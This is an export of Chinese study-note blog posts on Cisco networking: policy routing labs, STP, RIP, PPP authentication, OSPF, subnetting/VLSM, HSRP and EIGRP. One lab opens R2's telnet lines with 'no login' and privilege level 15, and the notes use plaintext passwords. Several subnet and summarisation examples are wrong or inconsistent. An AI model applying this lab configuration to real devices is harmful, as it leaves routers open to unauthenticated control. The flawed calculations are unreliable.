    <content type="text"><![CDATA[策略路由：策略路由提供了一种根据网络管理者制定的策略来进行数据包转发的机制。基于策略的路由比传统路由能力更强，使用更灵活，它使用网络管理者不仅能够根据目的地址，而且能够根据协议类型、报文大小、应用或IP源地址来选择转发路径。策略由路由映射表来定义。 实验一、基于源IP地址的策略路由配置实验目的： 1、用route-map定义路由策略 2、在接口下应用路由策略 3、基于源IP地址的策略路由的配置和调试 实验拓扑： 实验步骤： 在路由器R1的f0/0接口应用IP策略路由CCNA，使得从主机PC2来的数据设置一跳地址为：172.16.12.2；从主机PC3来的数据设置下一跳地址为：172.16.21.2，所有其他的数据包正常转发，整个网络运行EIGRP路由协议。 配置ACL R1(config)#access-list 1 permit 172.16.1.2 R1(config)#access-list 2 permit 172.16.1.3 配置路由映射表 R1(config)#route-map CCNA permit 10 R1(config-route-map)#match ip address 1 R1(config-route-map)#set ip next-hop 172.16.12.2 R1(config-route-map)#exit R1(config)#route-map CCNA permit 20 R1(config-route-map)#match ip address 2 R1(config-route-map)#set ip next-hop 172.16.21.2 应用策略路由 R1(config)#int f0/0 R1(config-if)#ip policy route-map CCNA 实验调试： 1、查看路由路径 ​ PC2#traceroute 172.16.2.2 ​ PC3#traceroute 172.16.2.2 2、在R1上显示调试信息 ​ R1#debug ip policy ​ PC2：ping 172.16.2.2 ​ PC6:ping 172.16.2.2 3、显示在哪些接口上应用了策略路由 ​ R1#sh ip policy 4、显示定义的所有路由策略及路由策略匹配的情况 实验二、基于数据包长度的策略路由配置实验目的： 1、用route-map定义路由策略 2、在接口下应用路由策略 3、基于数据包长度的策略路由的配置和调试 实验拓扑： 实验步骤： 在R1的f0/0接口应用IP策略路由CCNP，使得对大小为“64-100”字节的数据包设置出接口为s1/0;数据包大小“101-100”字节的数据包设置出接口为“f0/1”,所有其他的数据包正常转发，整个网络运行EIGRP路由协议。 配置路由映射表 R1(config)#route-map CCNP permit 10 R1(config-route-map)#match length 64 100 R1(config-route-map)#set interface s1/0 R1(config)#route-map CCNP permit 20 R1(config-route-map)#match length 101 1000 R1(config-route-map)#set interface f0/1 应用策略路由 R1(config)#int f0/0 R1(config-if)#ip policy route-map CCNP R1(config-if)#exit R1(config)#ip local policy route-map CCNP 实验调试： 1.在主机上执行扩展ping命令，在R1上显示调试信息。 ​ PC2：ping 172.16.2.2 repeat 1 size 90 ​ PC2：ping 172.16.2.2 repeat 1 size 300 ​ PC2：ping 172.16.2.2 repeat 1 size 1200 2、显示在哪些接口上应用了策略路由 ​ R1#sh ip policy 3、显示定义的所有路由策略及路由策略匹配的情况 ​ R1#sh route-map CCNP 实验三、基于应用的策略路由配置实验目的： 1、用route-map定义路由策略 2、在接口下应用路由策略 3、基于数据包长度的策略路由的配置和调试 实验拓扑： 实验步骤： 在R1的f0/0接口应用IP策略路由CCIE，使得对HTTP数据包设置一跳地址为：172.16.12.2，并且设置IP数据包优先级为”flash”,为telnet数据包设置下一跳地址为：172.16.21.2，并且设置IP数据包优先级为：critical，所有其他的数据包正常转发，整个路由协议运行EIGRP。 配置R2的http与telnet访问 R2(config)#ip http server R2(config)#line vty 0 4 R2(config-line)#no login R2(config-line)#privilege level 15 配置扩展ACL R1(config)#ip access-list extended HTTP R1(config-ext-nacl)#permit tcp any any eq 80 R1(config-ext-nacl)#exit R1(config)#ip access-list extended TELNET R1(config-ext-nacl)#permit tcp any any eq 23 配置路由映射表 R1(config)#route-map CCIE permit 10 R1(config-route-map)#match ip address HTTP R1(config-route-map)#set ip precedence flash R1(config-route-map)#set ip next-hop 172.16.12.2 R1(config)#route-map CCIE permit 20 R1(config-route-map)#match ip address TELNET R1(config-route-map)#set ip precedence critical R1(config-route-map)#set ip next-hop 172.16.21.2 应用路由映射表 R1(config)#int f0/0 R1(config-if)#ip policy route-map CCIE R1(config)#ip local policy route-map CCIE]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[STP生成树协议]]></title>
    <url>%2F2019%2F09%2F23%2FSTP%E7%94%9F%E6%88%90%E6%A0%91%E5%8F%8APVST%2F</url>
    <content type="text"><![CDATA[STP生成树协议介绍：交换机工作原理：根据MAC地址表转发数据帧，如果地址未知，则广播 广播风暴的产生：当网络中存在物理环路，会产生广播风暴。 STP生成树协议：当链路存在环路时，它会在逻辑上断开环路，防止广播风暴的产生。当线路出现故障，断开的接口被激活，恢复通信，充当备份线路的作用。 STP算法： ​ STP将一个环形网络生成无环拓扑的步骤： ​ 第一步：选择根网桥（Root Bridge） ​ 第二步：选择根端口（Root Ports） ​ 第三步：选择指定端口（Designated Ports） 选择根网桥（Root Bridge） ​ （1）如何选择根网桥 ​ 根据网桥ID（BID）选择根网桥，谁的优先级小，谁就是根网桥。如果优先级相同，谁的MAC地址小谁就是根网桥 ​ （2）什么是网桥ID（BID） ​ 每个网络只能有一个根桥，根桥具有最低的桥ID，根桥上的所有端口都是指定端口，选择根网桥的目的是为了给将生成的树形结构确定一个树根 ​ （3）实例 ​ 选择根端口（Root Ports） ​ （1）如何选择根端口 ​ 在非根网桥上选择一个到根网桥最近的端口作为根端口，选择依据是： ​ 根路径成本（cost值）最低 ​ 直连网桥的网桥ID最小 ​ 直连网桥的端口ID最小 ​ （2）什么是cost值 ​ cost值是根路径成本，是网桥到根网桥的路径上所有链路的成本之和 ​ 根路径成本表： ​ （3）什么是端口ID ​ ​ （4）实例 选择指定端口（Designated Ports） ​ （1）选择指定端口依据 ​ 在每个网段上，选择1个指定端口，根桥上的端口全是指定端口。 ​ 非根桥上的指定端口： ​ 根路径成本【从非根桥到根桥】最低 ​ 端口所在的网桥的ID值较小 ​ 直连网桥的端口ID值较小 生成树端口状态： 生成树计数器：交换机开机需要等待30秒时间开始转发数据，当某个正在使用的链路断掉。阻塞的端口需要50秒时间开始转发数据 BPDU（桥协议数据单元）：交换机怎么知道其他交换机的网桥ID？怎么知道哪个端口的根路径成本最小？ 是因为交换机之间使用BPDU来交换STP信息，BPDU（Bridge Protocol Data Unit）使用组播发送BPDU，组播地址为：01-80-c2-00-00-00。 BPDU分为2种类型： ​ 配置BPDU － 用于生成树计算 ​ 拓朴变更通告（TCN）BPDU － 用于通告网络拓朴的变化 STP使用BPDU选择根网桥：（1）交换机启动时，假定自己是根网桥，在外发送的BPDU中，根网桥ID字段填写自己的网桥ID （2）当接收到其他交换机发出的BPDU后，比较网桥ID，选择较小的添加到根网桥ID中 STP使用BPDU计算根路径成本：（1）根网桥发送根路径成本为0的BPDU （2）其他交换机收到根网桥的BPDU后，在根路径成本上添加接收接口的路径成本，然后转发 PVST（VLAN生成树）：PVST是Cisco私有，为每个VLAN构造一颗生成树的生成树协议 PVST在实际中，配置网络中比较稳定的交换机为根网桥，利用PVST实现网络的负载均衡 PVST配置命令：⚪启用生成树： Switch(config)#spanning-tree vlan 10 ⚪设置根网桥： Switch(config)#spanning-tree vlan 10 root primary/secondary -设置primary后，优先级变为24576，为主根桥 -设置secondary后，优先级变成28672，为次根桥 ⚪修改网桥的优先级： Switch(config)#spanning-tree vlan 10 priority Bridge-priority -优先级的值为4096的倍数 ⚪修改端口成本: Switch(config-if)#spanning-tree vlan 10 cost cost ⚪修改端口优先级: Switch(config-if)#spanning-tree vlan 10 port-priority priority ⚪配置上行速链路: Switch(config)#spanning-tree uplinkfast ⚪配置端口速链路： Switch(config-if)#spanning-tree portfast ⚪查看生成树的配置： Switch#show spanning-tree ⚪查看某个VLAN的生成树详细信息： Switch#show spanning-tree vlan 10 detail]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RIP路由协议]]></title>
    <url>%2F2019%2F09%2F23%2FRIP%2F</url>
    <content type="text"><![CDATA[动态路由协议-RIP：路由信息协议RIP（Routing Information Protocol）是基于距离矢量算法的路由协议，利用跳数来作为计量标准。 距离矢量路由协议是路由器定期将路由表的副本传递给邻居路由器并累计距离矢量。“距离”表示有多远，“矢量”表示在那个方向上 RIP协议的管理距离为120 RIP协议的工作原理：路由器开始运行RIP，当路由器的更新周期30秒到了的时候，会向邻居发送路由表。 Metric：度量值，衡量一条路由好坏的值。发送路由表时Metric值会加1，学习路由时，会学习最佳路由，将Metric值小的路由放到路由表当中。 RIP协议计数至无穷大的解决方法：定义最大跳数为15跳 RIP协议路由环路解决方法： ​ 1、水平分割 ​ -向原始信息的来源方向返回路由信息毫无用处 ​ 2、路由毒化和毒性逆转 ​ -当A中的一条路断开后，路由器将已经断开的路由的距离通告为无穷大。并立刻开启触发更新，向B发送更新包。B收到更新包后，将断开的路由标记为“可能已断开”，忽略水平分割，进行毒性逆转，向C发送路由信息，告诉C可能已断开 ​ 3、抑制计时器 ​ -路由器为网络中的“可能有故障”状态保留条目，以便为其它路由器重新计算拓扑更改留出时间 ​ 4、触发更新 ​ -路由表发生变化时，路由器发送更新 RIP路由协议的版本：RIP v1： 发送路由更新时不携带子网掩码，宣告主类网络，属于有类路由协议 发送路由更新时，目标地址为广播地址：255.255.255.255 RIP v2： 发送路由更新时携带子网掩码，属于无类路由协议 发送路由更新时，目标地址为组播地址：224.0.0.9 RIP路由协议的配置：R2(config)#router rip //进入rip协议配置R2(config-router)#version 2 //启用rip v2版本R2(config-router)#no auto-summary //关闭路由自动汇总R2(config-router)#network 192.168.12.0 //通过RIP宣告直连网段R2(config)#interface f0/1 //进入接口R2(config-if)#ip summary-address rip 172.16.0.0 255.255.252.0 //RIP手动路由汇总]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>路由协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PPP协议]]></title>
    <url>%2F2019%2F09%2F23%2FPPP%2F</url>
    <content type="text"><![CDATA[PPP协议：PPP是一种基于ISO的高级数据链路控制（ISO-HDLC）的WAN协议，工作在物理层和数据链接层。PPP基于开放式标准，并包括各种功能，这使它成为拨号连接和与用WAN连接的事实标准。能够控制数据链路的建立，能够对广域网的IP地址迚行分配和管理，允许同时采用多种网络层路由协议，能够配置和测试数据链路，能够有效进行错误检测。不与SLIP类似，PPP经常也是用于低速的串行链路，PPP优于HDLC的特点在于有认证机制，可以保证数据传输的安全性。 PPP的优点： 1、PPP支持在单根串行链路上运行多种协议，不只是IP协议 2、每一帧都有循环冗余检验 3、通信双方可以进行IP地址的动态协商（使用IP NCP） 4、不CSLIP类似，对TCP和IP报文首部进行压缩 PPP包括以下三个部分： 1、在串行链路上封装IP数据报的方法。PPP既支持数据为8位和无奇偶检验的异步模式（如大多数计算机上普遍存在的串行接口），还支持面向比特的同步链接 2、建立、配置和测试数据链路的链路控制协议（LCP：Link Control Protocol）它允许通信双方进行协商，以确定不同的选项。负责对L1的物理层的链路，进行链路的建立、控制、维护 3、针对不同网络层协议的网络控制协议（NCP：Network ControlProtocol）（IPCP＋CDPCP）体系。负责对L3的网络层，向下提供无差别的接口.负责建立和配置各种网络层协议 .当前RFC定义的网络层有IP、OSI网络层、DECnet以及AppleTalk。 PPP的帧格式： PPP的帧格式在ISO标准的帧格式的基础上新增了两个字段 1、协议字段：指出第3层协议（如IP戒IPX） 2、LCP字段：使得PPP的功能得以实现。 每个帧都以标志字符0x7e开始和结束。PPP帧的前3个字段和最后两个字段不HDLC的格式是一样的。PPP协议不是面向比特的，因而所有的PPP帧长度都是整数个字节。 地址字段：值始终是0xff 控制字段：值为0x03 协议字段： ​ 0x0021–信息字段是IP数据报 ​ 0xC021–信息字段是链路控制数据LCP ​ 0x8021–信息字段是网络控制数据NCP ​ 0xC023–信息字段是安全性认证PAP ​ 0xC223–信息字段是安全性认证CHAP 当信息字段中出现和标志字段一样的比特0x7E时，就必须采叏一些措施。因PPP协议是面向字符型的，所以它不能采用HDLC所使用的零比特插入法，而是使用一种特殊的字符填充。具体的做法是将信息字段中出现的每一个0x7E字节转发成2字节序列（0x7D，0x5E）。若信息字段中出现一个0x7D的字节，则将其转发成2字节序列（0x7D，0x5D）。若信息字段中出现ASCII码的控制字符，则在该字符前面要加入一个0x7D字节。这样做的目的是防止这些表面上的ASCII码控制字符被错误地解释为控制字符。CRC字段：即FCS，帧检验序列。是一个循环冗余检验码，以检测数据帧中的错误。 PPP的协商过程： 1、Interface Serial0, changedstate to up (L1 up)； 2、LCP: State is Open ； 3、PPP的认证（这是可选项目，如果进行认证，就必须成功，才有NCP的工作）； 4-1、se1 IPCP: State is Open (IP)； 4-2、se1 CDPCP: State is Open (cdp：show cdp neighbor)； 5：Line protocol on interface serial1,changed state toup (L2up)。 LCP包含了4大网络模块： 1、认证（authentication:PAP/CHAP） 2、压缩（compress） 3、回拨（callback） 4、多链路捆绑（mulit-link） 如果一个接口上有peer neighbor-route，那么这台设备就会自动学习到对端接口的32位主机路由。 PPP的认证和配置方式：PAP认证： 由被认证方发起，发送主认证方所配置的用户名和密码，并且是明文方式。主认证方检查被认证方发来的用户名及密码看与自己配置的本地用户名和密码是否匹配。 CHAP认证： 由主认证方主动发起，并且不会发送密码（这个用户名和密码是主认证端和被认证端都配置好的），而是发送一个随机数值。被认证方收到主认证端发来的随机数值后，将随机数与密码进行hash加密运算，将运算出的值连同自己配置的用户名一起发送给主认证端，主认证端收到被认证端发来的用户名和hash值后，根据被认证端发来的用户名，查找自己本地用户数据库中相同的用户名及对应的密码，并将这个用户名对应的密码与自己发送给被认证端的随机数值也进行hash算法加密，将得出的hash值与被认证端发来的hash值进行比较，如果两端hash一致则表示认证成功，这样就避免了在网络中传输密码，提高安全性。 PAP认证配置方式： 主认证端配置： R2(config)#interface s3/0R2(config)#ip address 192.168.1.2 255.255.255.0R2(config-if)#encapsulation ppp //封装ppp协议R2(config-if)#ppp authentication pap //启用pap认证R2(config-if)#peer default ip address pool pap-pool //创建名为pap-pool的地址池R2(config)#ip local pool pap-pool 192.168.1.10 192.168.1.20 //定义pap-pool池分配的地址范围R2(config)#username ccie password cisco //创建本地用户名和密码用于pap认证 被认证端配置： R1(config-if)#encapsulation ppp //封装ppp协议R1(config-if)#ppp pap sent-username ccie password cisco //设置发送的ppp认证的用户名和密码R1(config-if)#ip negotiated //开启ip地址协商获取R1(config-if)#peer neighbor-route //学习对端接口的32位主机路由R1#show ip intface brief 查看S3/0接口是否获取到了ip地址 CHAP认证配置方式： 主认证端配置： R2(config)#interface s3/0R2(config-if)#ip address 192.168.1.2 255.255.255.0R2(config-if)#peer default ip address pool chap-pool //定义chap-pool地址池的地址范围R2(config-if)#encapsulation ppp //封装PPP协议R2(config-if)#ppp authentication chap //启用chap认证R2(config)#username ccie password cisco //创建chap认证用的本地用户名密码R2(config)#ip local pool chap-pool 192.168.1.10 192.168.1.20 //定义地址池分配的地址范围 被认证端配置：]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OSPF-开放式最短路径优先协议]]></title>
    <url>%2F2019%2F09%2F23%2FOSPF%2F</url>
    <content type="text"><![CDATA[OSPF概述：OSPF(Open Shortest Path First开放式最短路径优先）是一个内部网关协议(Interior Gateway Protocol，简称IGP），用于在单一自治系统内决策路由。是对链路状态路由协议的一种实现，隶属内部网关协议（IGP），故运作于自治系统内部。著名的迪克斯加算法被用来计算最短路径树。OSPF支持负载均衡和基于服务类型的选路，也支持多种路由形式，如特定主机路由和子网路由等。 OSPF概述：1、通过交换hello数据包来创建邻居关系 2、以传播LSA代替路由表更新 3、将LSA泛洪到区域中得所有OSPF路由器，而不仅是直连路由器 4、收集由OSPF路由器生成的所有LSA以创建OSPF链路状态数据库 5、使用SPF算法计算到每个目的地的最短距离，并置于路由表中 链路：路由器接口 状态：描述接口以及它与邻居路由器的关系 LSA初次泛洪后，链路状态路由器将向所有其他路由器传递由事件触发的较小链路状态更新 多区域OSPF：在同一个自治系统中，通过接口划分区域，在ABR（区域边界路由器）中划分。 划分区域的好处： 1、减少路由表的路由条目 2、拓朴发生改变时，只影响本区域的数据库 3、每隔30分钟泛数据库信息（周期和触发更新），划分区域后，只在本区域泛洪 4、网络设计灵活 OSPF邻居状态： 邻居关系：Hello数据包 可使用命令debug ip ospf adj查看邻居建立的详细过程 down 路由器A刚启动时，ospf处于down的状态，因为它还没有与其他路由器交换信息。它使用组播地址224.0.0.5发送hello分组。 init 所有运行ospf的路由器收到A的hello分组时，将A加入邻居列表中，这是init状态。 2way 收到A的hello的路由器都向A发送单播应答，A收到后，将这些路由器加入邻居列表，所有路由器都建立了双向关系，进入了2way状态。 Exstart 如果链路类型是广播网络（如以太网），接下来必须选举DR和BDR，选举结束后，路由器处于预启动Exstart状态。 Exchange 然后交换链路状态数据库摘要，也就是交换DBD，这是Exchange状态。 Loading DBD交换完毕后进入Loading状态 Full 路由器根据DBD发送LSR请求更新链路状态条目，对方用LSU进行响应。至此，双方都学到了路由条目，database完整，就是Full状态。 DR/BDR选取： （1）在多路访问网络中，DROTHER路由器只与DR与BDR建立邻接关系，DROTHER之间只建邻居关系。 （2）DR与BDR有自己的组播地址：224.0.0.6 （3）DR与BDR选取原则，首要因素是时间，其次是接口优先级（多路访问网络的接口优先级为1，点到点网络接口优先级为0。ip ospf priority 可以修改接口优先级，若为0则不参与DR选举，再次是路由器ID：先比环回接口，再比物理接口 （4）DR与BDR选取是非抢占的，以下情况会重选，重启ospf进程或路由器、参与的路由器都执行clear ip ospf process命令、DR故障、OSPF接口优先级为0。 （5）如果DR故障，BDR接管DR，如果BDR故障，选新的BDR。 OSPF配置方法：配置单区域OSPF：Router（config)#router ospf 1 //建立一个OSPF，ID号为1Router（config-router)#network 192.168.10.0 0.0.0.255 area 0 //声明网络，区域为0 配置OSPF负载均衡： 路径必须为等价路径 默认情况下，最多加入四条等价路由 通过更改配置，最多可以配置16条路径 R1(config-router)# maximum-paths &lt;value&gt; 可更改特殊链路的开销以确保路径等价于负载均衡 R1(config-router)# ip ospf &lt;value&gt; 配置OSPF身份验证：1、OSPF身份验证可以基于端口、基于区域、基于链路进行验证 2、OSPF支持明文和MD5身份验证 3、路由器生成并检查每个OSPF数据包 4、路由器验证接收到的每个路由更新数据包的来源 5、配置“密钥”：每个参与的邻居都必须配置相同的密钥 配置明文验证： R1(config-if)#ip ospf authentication-key ccie 设置明文密码为ccie，两端密码要一直R1(config-if)#ip ospf authentication 开启认证 配置密文验证： R1(config-if)#ip ospf message-digest-key 1 md5 ccieR1(config-if)#ip ospf authentication 配置区域认证： R1(config-if)#ip ospf message-digest-key 1 md5 ccieR1(config-router)#area 1 authentication message-digest 验证OSPF配置：R1#show ip protocols //查看是否配置OSPFR1#show ip ospf neighbor //查看邻居表R1#show ip ospf database //查看链路状态数据库R1#show ip route ospf //查看路由表R1#show ip ospf //查看OSPF进程及相关信息R1#show ip ospf f0/0 //查看OSPF接口信息 OSPF路由手工汇总：1、区域间路由汇总必须在ABR上完成 2、外部路由汇总必须在ASBR上完成 3、“no-advertise”参数阻止传递汇总路由]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>路由协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IP地址介绍及VLSM]]></title>
    <url>%2F2019%2F09%2F23%2FIP%E5%9C%B0%E5%9D%80%E4%BB%8B%E7%BB%8D%E5%8F%8AVLSM%2F</url>
    <content type="text"><![CDATA[IPV4编址方案：IP地址由32位二进制数组成，这些位被划分为4组，中间用“.”号隔开，每组8位，以十进制数形式表示。分为网络地址和主机地址两个部分。 IP地址分类：⚫A类网络地址： 第一个字节的第一位必须为0，第一个字节的取值为0-127 即：0xxxxxxx 取值范围是：00000000－01111111 （0-127） 例如：1.1.1.1/8 网络号：8位 255.0.0.0 网络地址：1.0.0.0 广播地址：1.255.255.255 网络地址数：2^24 有效地址：2^24-2 实际可用的A类网络地址数为：2^7=128 合法的主机数为：2 ^24-2＝16777214 私有地址范围：10.0.0.0~10.255.255.255 私有IP地址是一段保留的IP地址。只使用在局域网中，无法在Internet上使用 ⚫B类网络地址范围： 第一个字节的第一位必须是1，且第二位必须是0，第一个字节的取值为128-191 即：10000000 取值范围是：10000000-10111111 （128-191） 例如：172.16.0.0/16 网络号：16位 255.255.0.0 网络地址：172.16.0.0 广播地址：172.16.255.255 网络地址数：2^16 有效地址：2^16-2 实际可用的B类网络地址数为：2^14=16384 合法的主机数为：2^16-2=65534 私有地址范围：172.16.0.0~172.31.255.255 ⚫C类网络的地址范围: 第一个字节的前两位必须是1，且第三位必须是0，第一个字节的取值为192-223 即：11000000 取值范围是：11000000－11011111 （192-223） 例如：192.168.1.1/24 网络号：24位 255.255.255.0 网络地址：192.168.1.0 广播地址：192.168.1.255 网络地址数：2^8 有效地址：2^8-2 实际可用的C类网络地址数为：2^21=2097152 合法的主机数为：2^8-2=254 私有地址范围：192.168.0.0~192.168.255.255 ⚫D类网络的地址范围: 第一个字节为224-239，用作组播地址。 ⚫E类网络的地址范围： 第一个字节为240-255，用于科学用途。 保留的IP地址：1、网络地址全为0：表示当前网络或网段 2、网络地址全为1：表示所有网络 3、地址127.0.0.1：保留用于环回测试 4、节点地址全为0：表示网络地址或指定网络中的任何主机 5、节点地址全为1：表示指定网络中的所有节点 6、整个IP地址全为0：思科路由器用它来指定默认路由，也可能表示任何网络 7、整个IP地址全为1：到当前网络中所有节点的广播，有时称为“全1广播”或限定广播，即：255.255.255.255 子网划分：将大的网络划分成若干个小网络，尽量减少广播风暴，提高网络效率。 例：192.168.1.16/27 ​ 此网络后缀为/27，借位数为27-24=3，子网数为2^3=8 ​ 二进制表示：11111111.11111111.11111111.11100000 ​ 子网块大小：256/8=32 ​ 子网掩码：255.255.255.(256-32)=255.255.255.224 ​ 网络号：192.168.1.0 ​ 广播号：192.168.1.31 ​ 有效地址范围：192.168.1.1~192.16.1.62 子网创建步骤： ​ （1）确定需要的网络ID数 ​ ■ 每个LAN子网一个 ​ ■ 每条广域网连接一个 ​ （2）确定每个子网所需的主机ID数 ​ ■每个TCP/IP主机一个 ​ ■每个路由器接口一个 ​ （3）根据上述需要，确定如下内容： ​ ■一个用于整个网络的子网掩码 ​ ■每个物理网段的唯一子网ID ​ ■每个子网的主机ID范围 CIDR： CIDR（classless inter-domain routing）,无类域间选择，它是ISP用来将大量地址分配给客户的一种方法。 CIDR值表： 子网掩码 后缀 子网掩码 后缀 255.0.0.0 /8 255.255.240.0 /20 255.128.0.0 /9 255.255.248.0 /21 255.192.0.0 /10 255.255.252.0 /22 255.224.0.0 /11 255.255.254.0 /23 255.240.0.0 /12 255.255.255.0 /24 255.248.0.0 /13 255.255.255.128 /25 255.252.0.0 /14 255.255.255.192 /26 255.254.0.0 /15 255.255.255.224 /27 255.255.0.0 /16 255.255.255.240 /28 255.255.128.0 /17 255.255.255.248 /29 255.255.192.0 /18 255.255.255.252 /30 255.255.224.0 /19 VLSM(变长子网掩码)：VLSM网络划分：使用长度不同的子网掩码将网络划分成多个子网，适用于不同类型的网络设计，称为VLSM组网。 分类路由选择：RIPv1，IGRP协议 无类路由选择：RIPv2，EIGRP，OSPF等协议 有类路由：汇总以后地址是标准的A B C类地址掩码 即 255.0.0.0 255.255.0.0 255.255.255.0 （有类路由里 大类网络中 子网码必须一致 这样叫做有类路由 因为有类路由协议不传递子网码信息） 无类路由：汇总以后地址是无类的比如 172.16.12.0/16 -172.16.15.0/16 汇总以后的地址是 172.16.12.0/20 子码 不属于 A B C 3个类别（无类路由是相反的 他传递子网信息所有大类网络中可以使用不同的子网码） 例：将192.168.10.0/24网段划分成5个子网，每个子网主机数如下： ​ 网络一：25台 网络二：12台 网络三：10台 ​ 网络四：6台 网络五：2台 ​ 步骤： ​ 1、将主机数从大到小排列 ​ 2、分配子网块大小 ​ 3、计算子网范围、掩码等 ​ 网络一的块大小为32能满足条件 ​ 网络二的块大小为16能满足条件 ​ 网络三的块大小为16能满足条件 ​ 网络二的块大小为8能满足条件 ​ 网络二的块大小为4能满足条件 ​ 然后从192.168.10.0开始分配，块大小越大的越先分配，这样不会造成地址浪费。若从小到大分配，会导致不能连续分配地址，子网与子网之间必须要间隔一段，这一段将不能使用。所以分配地址的时候最好按照子网大小，从大到小分配。 地址汇总：地址汇总也叫路由聚合，让路由选择协议能够用一个地址通告众多网络。旨在缩小路由器中路由选择表的规模，以节省内存，并缩短IP对路由选择表进行分析以找出前往远程网络的所需时间。 地址汇总步骤： ​ 1、确定变化位置 ​ 2、计算块大小 例：192.168.16.0-192.168.31.0 ​ 首先确定变化位置在第3字节，然后变化量为31-16=15，则块大小为16能满足。 ​ 子网掩码：255.255.(256-16).0=255.255.240.0 ​ 后缀：16+4=/20 ​ 网络范围：192.168.16.0~192.168.31.0]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HSRP热备份路由协议]]></title>
    <url>%2F2019%2F09%2F23%2FHSRP%2F</url>
    <content type="text"><![CDATA[HSRP（热备份路由协议）：热备份路由协议(HSRP) 是思科推出的用于建立容错默认网关的专有冗余协议，由RFC 2281进行描述。 虚拟路由冗余协议(VRRP) 是基于标准的HSRP替代协议，由IETF标准RFC 3768进行描述。这两种技术在概念上相似，但互不兼容。 HSRP工作原理：HSRP在网络路由器之间建立默认网关的倒换框架，当主网关不可达时进行切换。此协议经常与快速会聚路由协议EIGRP或OSPF协同工作。HSRP使用多播地址224.0.0.2和UDP端口1985向其他启用HSRP协议的路由器发送HELLO报文，来交流路由器间的优先级。配置有最高优先级的主路由器将成为虚拟路由器，以预先配置好的网关IP和MAC地址0000.0c07.acXX（XX是组IP的十六进制值）回应局域网对网关的ARP的请求。如果主路由器宕机，次优先级路由器将接管网关IP并以同样的MAC地址回应ARP的请求，这样就实现了透明的默认网关自动倒换。 热备份路由协议确保在某一时间内只有一台路由器（称为主动路由器）以虚拟路由器的名义转发数据包。备份路由器被选择，并时刻准备成为主动路由器（在当前主动路由器失效的情况下）。热备份路由协议定义了一种通过IP地址来确定主动和备份路由器的机制。一旦这些确定了，一个主动路由器出故障就不会出现重大的连接中断现象。 在任何特定的网络中，可能有多个，也可能是重叠的，热备份群，每一个都有单一的媒体访问控制（MAC）地址和IP地址；IP地址应该属于初级子网，但它必须与实际或虚拟的地址（分配给网络中路由器或主机的地址）不同。 HSRP和VRRP都不是路由协议，因为它们不发布IP路由也不影响路由表。 HSRP配置：Router(config)#int vlan 10 //进入vlan接口Router(config-if)#ip add 192.168.10.252 255.255.255.0 //配置vlan地址Router(config-if)#standby 10 ip 192.168.10.254 //配置虚拟网关Router(config-if)#standby 10 priority 120 //配置优先级（默认100）Router(config-if)#standby 10 preemp //配置抢占Router(config-if)#standby 10 timers 3 10 //配置hello时间，每隔3秒发送一次，一次维持10秒Router(config-if)#standby 10 track f0/1 //配置端口跟踪 因为在一个网络中，vlan的地址不能相同，所以两个相同的vlan使用不同的vlan地址，但是两者都虚拟出同一个地址作为网关]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EIGRP-增强内部网关路由协议]]></title>
    <url>%2F2019%2F09%2F23%2FEIGRP%2F</url>
    <content type="text"><![CDATA[EIGRP：EIGRP:Enhanced Interior Gateway Routing Protocol 即 增强内部网关路由协议。也翻译为 加强型内部网关路由协议。 EIGRP是Cisco公司的私有协议（2013年已经公有化）。 EIGRP结合了链路状态和距离矢量型路由选择协议的Cisco专用协议，采用弥散修正算法（DUAL）来实现快速收敛，可以不发送定期的路由更新信息以减少带宽的占用，支持Appletalk、IP、Novell和NetWare等多种网络层协议。 EIGRP的特点：高级距离矢量 网络设计灵活 快速收敛 用组播和单播地址来代替广播 无环路的无类路由 支持VLSM和不连续的子网 配置简单 在Internet网络中任意点手动汇总 逐步更新 支持多种网络层协议 在开销相等和不相等的路径上实现负载均衡 EIGRP的管理距离为90 EIGRP的关键技术：邻居发现/恢复机制：在邻居间使用hello报文，配置了EIGRP的路由器会主动建立与邻居的关系，建立邻接使用Hello报文发送每5或60秒。如果邻居错过了连续3个Hello报文的路由将被视为无效。默认值=15秒或180秒。 可靠传输协议（RTP）：确保EIGRP报文可靠,有序地传送到所有邻居 扩散更新算法（DUAL）：为去往每个目标选择最小开销,无环路的路径 协议无关模块（PDMs）：EIGRP支持为IP,Apple Talk,IPX等协议计算路由 EIGRP内容：EIGRP表：分别是邻居表、拓扑表、路由表 AD和FD： ​ 通告距离（AD）：也称报告距离，下一跳路由器到目的地的度量值 ​ 可行距离（FD）：是本地路由器到达目的地的度量值 后继者与可行后继： ​ 后继者（successor）：后继者是一个相邻路由器具有最低成本的路径到目的地（最低FD），是保证不会循环的一部分，后继路由用于转发数据包，如果他们具有相同的FD，可以存在多条相同路径。 ​ 可行后继（Feasible successor）：一个可行后继是离目的地很近的邻居，但不是最低开销的，一个可行后继确保一个无环拓扑，因为它的AD必须小于后继的FD。可行后继和后继在同一时间进行选择,但它只保存在拓扑表作为备份路径。拓扑表中可以保存多个可行后继为一个目的地。 EIGRP Packets： Initial Route Discovery： EIGRP度量值的计算（metric）：EIGRP使用一个复合度量，可根据以下指标： 带宽 使用最小的带宽（BW）， 可靠性 是衡量一个链接将失败的可能性. 延迟 延迟是衡量一个包需要穿越路由的时间. 负载 反映了多少流量是使用链接 MTU 最大传输单元 默认情况下使用带宽和延迟！ metric值计算方法：metric值=256((10^7/bw)+(dly之和/10)) ​ -bw:最小带宽 ​ 